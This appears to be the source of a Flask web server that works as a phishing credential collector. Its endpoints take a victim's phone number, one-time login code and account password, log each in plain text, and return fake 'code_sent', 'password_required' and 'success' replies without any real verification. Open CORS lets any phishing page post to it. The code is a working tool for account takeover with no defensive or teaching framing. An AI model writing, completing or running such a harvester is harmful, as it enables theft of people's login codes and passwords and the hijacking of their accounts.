from flask import Flask, request, jsonify
import logging
from flask_cors import CORS

app = Flask(__name__)
CORS(app)
logging.basicConfig(level=logging.INFO)

@app.route('/auth', methods=['POST'])
def auth():
    data = request.get_json()
    phone = data.get('phone')
    logging.info(f"🔐 Auth attempt: {phone}")
    return jsonify({'status': 'code_sent'})

@app.route('/code', methods=['POST'])
def verify_code():
    data = request.get_json()
    phone = data.get('phone')
    code = data.get('code')
    logging.info(f"📱 Code for {phone}: {code}")
    return jsonify({'status': 'password_required'})

@app.route('/password', methods=['POST'])
def verify_password():
    data = request.get_json()
    phone = data.get('phone')
    password = data.get('password')
    logging.info(f"🔑 Password for {phone}: {password}")
    return jsonify({'status': 'success'})

@app.route('/test', methods=['GET'])
def test():
    return jsonify({'message': '✅ Server is WORKING!'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
